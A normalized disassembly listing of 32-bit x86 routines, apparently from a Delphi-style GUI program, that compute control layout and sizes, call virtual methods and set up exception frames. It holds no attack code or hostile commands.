mov [ ebp - 0x8 ] edi
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x8 ] 0x1
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x48 ]
mov [ ebx + 0x26c ] eax
mov eax [ edi + 0x4c ]
mov [ ebx + 0x268 ] eax
mov al [ ebx + 0x227 ]
sub al 0x1
jb r-xdata
mov eax ebx
call sub_44c2bc
sub eax [ ebx + 0x254 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
push eax
mov eax ebx
call sub_44c278
sub eax [ ebx + 0x254 ]
pop edx
sub eax edx
push eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add eax [ ebx + 0x258 ]
mov edx [ ebx + 0x254 ]
pop ecx
call sub_417298
push esi
push edi
mov edi esi
lea esi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_481a8c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
dec al
je r-xdata
mov eax [ esi + 0x4 ]
mov edx [ ebp + 0x18 ]
mov [ edx ] eax
mov eax [ esi ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebp + 0x10 ]
mov edx [ ebx + 0x268 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x48 ]
add eax [ ebx + 0x228 ]
add [ esi ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x48 ]
add edx [ ebx + 0x258 ]
cmp eax edx
jge r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_481a8c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
dec al
je r-xdata
mov eax ebx
call sub_44c2bc
sub eax [ esi + 0x4 ]
sub eax [ ebx + 0x254 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
push eax
mov eax ebx
call sub_44c278
sub eax [ ebx + 0x258 ]
pop edx
sub eax edx
push eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add eax [ ebx + 0x258 ]
mov edx [ ebx + 0x254 ]
add edx edx
xor ecx ecx
mov cl [ ebx + 0x25c ]
add edx [ ecx * 4 + rw-data ]
mov ecx [ esi + 0x4 ]
add ecx [ ebx + 0x268 ]
add edx ecx
pop ecx
call sub_417298
push esi
mov edi esi
lea esi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
inc [ ebx + 0x250 ]
mov eax [ esi + 0x4 ]
mov edx [ ebp + 0x18 ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x48 ]
jge r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_481a8c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x48 ]
sub ecx edx
mov edi [ ebp - 0x4 ]
mov [ edi ] ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + 0x8 ]
dec ecx
cmp eax ecx
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x48 ]
sub edx eax
sub edx [ ebx + 0x258 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] edx
add eax [ ebx + 0x254 ]
add eax [ ebx + 0x228 ]
sub [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
call sub_44c2bc
sub eax [ esi + 0x4 ]
sub eax [ ebx + 0x254 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
push eax
mov eax ebx
call sub_44c278
sub eax [ ebx + 0x258 ]
pop edx
sub eax edx
push eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add eax [ ebx + 0x258 ]
mov edx [ ebx + 0x254 ]
add edx edx
xor ecx ecx
mov cl [ ebx + 0x25c ]
add edx [ ecx * 4 + rw-data ]
mov ecx [ esi + 0x4 ]
add ecx [ ebx + 0x268 ]
add edx ecx
pop ecx
call sub_417298
push esi
mov edi esi
lea esi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
inc [ ebx + 0x250 ]
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x4c ]
jge r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_481a8c
test al al
je r-xdata
add edx [ ebx + 0x228 ]
sub [ esi + 0x8 ] edx
sub [ esi + 0x8 ] edx
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebx + 0x268 ]
mov [ eax ] edx
jmp r-xdata
mov eax [ esi + 0x4 ]
mov edx [ ebp + 0x18 ]
mov [ edx ] eax
mov eax [ ebp + 0x18 ]
mov edx [ ebx + 0x254 ]
mov [ eax ] edx
jmp r-xdata
mov eax ebx
call sub_44c2bc
sub eax [ ebx + 0x254 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
push eax
mov eax ebx
call sub_44c278
mov ecx eax
sub ecx [ ebx + 0x258 ]
pop eax
sub ecx eax
mov eax [ esi ]
add eax [ ebx + 0x26c ]
mov edx [ ebx + 0x258 ]
add edx edx
add eax edx
xor edx edx
mov dl [ ebx + 0x25c ]
add eax [ edx * 4 + rw-data ]
mov edx [ ebx + 0x254 ]
call sub_417298
push esi
mov edi esi
lea esi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
inc [ ebx + 0x24c ]
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x4c ]
jge r-xdata
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add eax [ ebx + 0x26c ]
mov [ esi + 0x8 ] eax
mov eax [ esi ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebp + 0x14 ]
mov edx [ ebx + 0x26c ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4c ]
add eax [ ebx + 0x228 ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov eax [ esi + 0xc ]
sub eax [ edi + 0x4c ]
sub eax [ ebx + 0x228 ]
mov edx [ ebp + 0x18 ]
mov [ edx ] eax
mov eax ebx
call sub_44c2bc
sub eax [ edi + 0x4c ]
sub eax [ ebx + 0x258 ]
mov edx [ ebp + 0x18 ]
mov [ edx ] eax
jmp r-xdata
mov eax ebx
call sub_44c2bc
sub eax [ ebx + 0x254 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add eax [ ebx + 0x258 ]
mov ecx [ esi + 0x8 ]
sub ecx [ ebx + 0x26c ]
mov edx [ ebx + 0x258 ]
add edx edx
sub ecx edx
xor edx edx
mov dl [ ebx + 0x25c ]
sub ecx [ edx * 4 + rw-data ]
mov edx [ ebx + 0x254 ]
call sub_417298
push esi
push edi
mov edi esi
lea esi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
inc [ ebx + 0x24c ]
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x26c ]
sub edx eax
mov ecx [ ebp - 0x4 ]
mov [ ecx ] edx
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4c ]
add eax [ ebx + 0x228 ]
sub [ esi + 0xc ] eax
sub_480468
push ebx
push esi
push edi
push ebp
add esp 0xffffffe4
mov ebx eax
mov esi [ ebx + 0x210 ]
test esi esi
je r-xdata
add esp 0x1c
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_47d750
test al al
je r-xdata
mov esi [ ebx + 0x210 ]
xor eax eax
mov al [ esi + 0x14 ]
cmp eax 0x4
ja r-xdata
jmp [ eax * 4 + jump_table_4804a9 ]
mov eax [ ebx + 0x210 ]
call sub_47d61c
mov eax [ eax + 0xc ]
push eax
mov eax esi
call sub_47d61c
mov eax [ eax + 0xc ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebx + 0x48 ]
sub edx eax
xor ecx ecx
mov eax [ ebx + 0x21c ]
call sub_424ff8
jmp r-xdata
mov eax esi
call sub_47d61c
mov eax [ eax + 0xc ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebx + 0x21c ]
call sub_424ff8
jmp r-xdata
lea edx [ esp + 0xc ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0xc ]
push eax
mov eax [ ebx + 0x210 ]
call sub_47d61c
mov ecx [ eax + 0xc ]
mov eax [ ebx + 0x21c ]
pop edx
call sub_425274
jmp r-xdata
mov eax esi
call sub_47d61c
mov eax [ eax + 0xc ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x210 ]
call sub_47d61c
mov eax [ eax + 0xc ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov ebp eax
mov eax ebx
call sub_44c278
cdq
idiv [ esp + 0x4 ]
test eax eax
jl r-xdata
inc eax
mov [ esp + 0x8 ] eax
mov [ esp ] 0x0
inc [ esp ]
dec [ esp + 0x8 ]
jne r-xdata
inc esi
xor edi edi
mov eax ebx
call sub_44c2bc
cdq
idiv ebp
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebx + 0x210 ]
call sub_47d61c
mov eax [ eax + 0xc ]
push eax
mov ecx ebp
imul ecx edi
mov edx [ esp + 0x8 ]
imul edx [ esp + 0x4 ]
mov eax [ ebx + 0x21c ]
call sub_424ff8
inc edi
dec esi
jne r-xdata
sub_4805d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
push edi
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_44d040
cmp [ ebx + 0x224 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
mov [ edi ] al
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
mov al 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
sub_480638
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d07c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f950
xor eax eax
push ebp
push sub_48078d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403458
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_481450
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x6c ]
call sub_47dd78
mov edx [ ebp - 0x4 ]
mov [ edx + 0x210 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
push edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403458
mov edx eax
mov ecx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
jmp r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
push edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403458
mov edx eax
mov ecx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe4 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480794
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_47d6b0
mov dl 0x1
call sub_47cd2c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_44f958
mov eax [ ebp - 0x4 ]
call sub_44f978
retn
push edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403458
mov edx eax
mov ecx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe8 ]
sub_4807a0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x23a ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x110 ]
mov [ esp ] eax
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x23c ]
call [ ebx + 0x238 ]
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_4807dc
push ebx
push ecx
mov [ esp ] edx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_480800
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x2 ] dx
mov esi eax
xor eax eax
push ebp
push sub_4808ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x114 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
xor ebx ebx
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebx + 0x40 ]
mov eax [ eax + 0x30 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax esi
call sub_480ed8
mov edx [ ebp - 0x8 ]
call sub_47df90
mov ebx eax
mov eax esi
call sub_480ed8
cmp [ eax + 0x28 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
cmp [ ebx + 0x51 ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_47eb74
mov edx [ ebp - 0xc ]
mov ax [ ebp - 0x2 ]
call sub_464224
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4808b3
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_4808bc
push ebx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_480f04
test al al
je r-xdata
mov eax ebx
call sub_44fde8
test eax eax
jle r-xdata
mov eax ebx
call sub_480ed8
xor edx edx
call sub_47df90
pop ebx
retn
sub_4808f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_48097c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x114 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480983
lea eax [ ebp - 0xc ]
call sub_404038
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x108 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x108 ]
lea edx [ ebp - 0xc ]
call sub_44c874
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_40810c
test eax eax
jne r-xdata
sub_480990
push ebx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_480f04
test al al
je r-xdata
mov eax ebx
call sub_480ed8
call sub_419748
dec eax
push eax
mov eax ebx
call sub_480ed8
pop edx
call sub_47df90
pop ebx
retn
sub_4809c8
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xec ]
jmp r-xdata
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp [ eax + 0x40 ] 0x0
je r-xdata
xor ecx ecx
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf4 ]
mov edx [ eax + 0x40 ]
test edx edx
je r-xdata
cmp [ edx + 0x57 ] 0x0
je r-xdata
sub_480a00
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x140 ]
jmp r-xdata
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov edx [ eax + 0x40 ]
cmp [ edx + 0x57 ] 0x0
je r-xdata
xor ecx ecx
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf0 ]
sub_480a34
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
push edi
mov esi eax
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax 0x1
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp [ edx + 0x250 ] 0x1
jle r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp [ edx + 0x24c ] 0x1
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ edx + 0x250 ]
cdq
idiv ecx
mov edx eax
mov eax 0x1
jmp r-xdata
pop edi
pop esi
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x100 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ edx + 0x24c ]
cdq
idiv ecx
mov edx eax
mov eax 0x1
jmp r-xdata
mov ecx edx
imul ecx eax
cmp ecx [ ebp - 0x4 ]
jl r-xdata
mov ecx edx
imul ecx eax
cmp ecx [ ebp - 0x8 ]
jl r-xdata
inc eax
inc eax
sub_480ad0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
push 0x0
mov edx esi
mov cl 0x1
mov eax [ ebp - 0x4 ]
call sub_4509a4
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x7fffffff
push ebp
mov eax esi
call sub_480a34
pop ecx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x114 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
xor ebx ebx
inc ebx
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_480ed8
mov edx ebx
call sub_47df90
mov eax [ eax + 0x40 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_480ed8
mov edx ebx
call sub_47df90
cmp [ eax + 0x40 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x4 ]
call sub_480ed8
mov edx ebx
call sub_47df90
mov eax [ eax + 0x40 ]
lea edx [ ebp - 0x28 ]
call sub_44c214
lea eax [ ebp - 0x28 ]
call sub_480a34
pop ecx
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov edi [ esi ]
mov eax [ esi + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_480ed8
mov edx ebx
call sub_47df90
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x40 ]
cmp eax [ esi ]
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_480ed8
mov edx ebx
call sub_47df90
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x44 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_480ed8
mov edx ebx
call sub_47df90
mov eax [ eax + 0x40 ]
mov edi [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_480ed8
mov edx ebx
call sub_47df90
mov eax [ eax + 0x40 ]
lea edx [ ebp - 0x28 ]
call sub_44c214
mov eax [ ebp - 0x20 ]
cmp eax [ esi ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_480ed8
mov edx ebx
call sub_47df90
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_480ed8
mov edx ebx
call sub_47df90
mov eax [ eax + 0x40 ]
lea edx [ ebp - 0x28 ]
call sub_44c214
mov eax [ ebp - 0x1c ]
cmp eax [ esi + 0x4 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_480ed8
mov edx ebx
call sub_47df90
mov eax [ eax + 0x40 ]
lea edx [ ebp - 0x28 ]
call sub_44c214
mov edi [ ebp - 0x20 ]
mov eax [ esi ]
sub eax edi
mov edx [ esi ]
sub edx edi
imul edx
mov edx [ esi + 0x4 ]
sub edx [ ebp - 0x10 ]
mov ecx [ esi + 0x4 ]
sub ecx [ ebp - 0x10 ]
imul edx ecx
add eax edx
cmp eax [ ebp - 0xc ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_480ed8
mov edx ebx
call sub_47df90
mov eax [ eax + 0x40 ]
lea edx [ ebp - 0x28 ]
call sub_44c214
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_480ed8
mov edx ebx
call sub_47df90
mov eax [ eax + 0x40 ]
mov [ ebp - 0x8 ] eax
sub_480cd0
push ebx
push esi
mov ebx eax
xor ecx ecx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf0 ]
jmp r-xdata
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov edx [ eax + 0x40 ]
cmp [ edx + 0x57 ] 0x0
je r-xdata
xor ecx ecx
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf0 ]
sub_480d08
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
xor edi edi
test esi esi
je r-xdata
test bl bl
je r-xdata
mov eax ebp
call sub_480f04
test al al
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov edx [ eax ]
call [ edx + 0x140 ]
mov edi eax
test bl bl
je r-xdata
mov eax esi
call sub_4193b8
push eax
mov eax ebp
call sub_480ed8
call sub_419748
dec eax
pop edx
cmp edx eax
jge r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx + 0x114 ]
dec eax
jle r-xdata
mov eax esi
call sub_4193b8
inc eax
push eax
mov eax ebp
call sub_480ed8
pop edx
call sub_47df90
mov edi eax
jmp r-xdata
mov eax ebp
call sub_480ed8
xor edx edx
call sub_47df90
mov edi eax
jmp r-xdata
sub_480d94
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
xor edi edi
test esi esi
je r-xdata
test bl bl
je r-xdata
mov eax esi
call sub_4193b8
test eax eax
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov edx [ eax ]
call [ edx + 0xec ]
mov edi eax
test bl bl
je r-xdata
mov eax esi
call sub_4193b8
dec eax
push eax
mov eax ebp
call sub_480ed8
pop edx
call sub_47df90
mov edi eax
jmp r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx + 0x114 ]
dec eax
jle r-xdata
mov eax ebp
call sub_480ed8
call sub_419748
dec eax
push eax
mov eax ebp
call sub_480ed8
pop edx
call sub_47df90
mov edi eax
jmp r-xdata
sub_480e10
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x114 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_480ed8
mov edx esi
call sub_47df90
mov eax [ eax + 0x40 ]
pop esi
pop ebx
retn
sub_480e44
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov esi [ ebx + 0x210 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
sub dl 0x1
jb r-xdata
cmp [ esi + 0x14 ] 0x3
jne r-xdata
je r-xdata
mov eax esi
call sub_47d61c
call sub_4276e8
mov edx [ eax ]
call [ edx + 0x2c ]
mov edi eax
jmp r-xdata
cmp [ esi + 0x14 ] 0x4
jne r-xdata
dec dl
je r-xdata
mov eax esi
call sub_47d61c
call sub_4276e8
mov edx [ eax ]
call [ edx + 0x2c ]
mov edi eax
jmp r-xdata
mov al [ esi + 0x14 ]
add al 0xfd
sub al 0x2
jae r-xdata
jmp r-xdata
mov eax esi
call sub_47d61c
call sub_4276e8
mov edx [ eax ]
call [ edx + 0x2c ]
mov edi eax
sub_480ebc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x148 ]
mov ecx esi
mov edx ebx
mov ebx [ eax ]
call [ ebx ]
pop esi
pop ebx
retn
sub_480ed8
xor edx edx
mov ecx [ eax + 0x210 ]
test ecx ecx
je r-xdata
mov eax edx
retn
cmp [ eax + 0x270 ] 0x0
je r-xdata
mov eax ecx
call sub_47d6b0
mov edx eax
mov eax ecx
call sub_47d63c
mov edx eax
jmp r-xdata
sub_480f04
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ ebx + 0x210 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x270 ] 0x0
je r-xdata
mov eax edx
call sub_47d670
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x1c ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_419748
test eax eax
jg r-xdata
mov al 0x1
jmp r-xdata
sub_480f48
push ebx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_480f04
test al al
je r-xdata
mov eax ebx
call sub_480ed8
call sub_419748
pop ebx
retn
sub_480f74
push ebx
mov ebx eax
mov eax ebx
call sub_44e980
mov eax [ ebx + 0x214 ]
test eax eax
je r-xdata
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
mov edx eax
mov eax ebx
call sub_481450
pop ebx
retn
mov eax ebx
call sub_481dd0
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x12c ]
sub_480fb0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_44bd1c
dec bl
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x214 ]
jne r-xdata
cmp edi [ esi + 0x220 ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
xor eax eax
mov [ esi + 0x214 ] eax
jmp r-xdata
test [ esi + 0x1c ] 0x8
jne r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x12c ]
sub_48102c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_425154
xor eax eax
push ebp
push sub_4810ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov edx ebx
call sub_4255f0
xor eax eax
push ebp
push sub_4810a7
push [ fs : eax ]
mov [ fs : eax ] esp
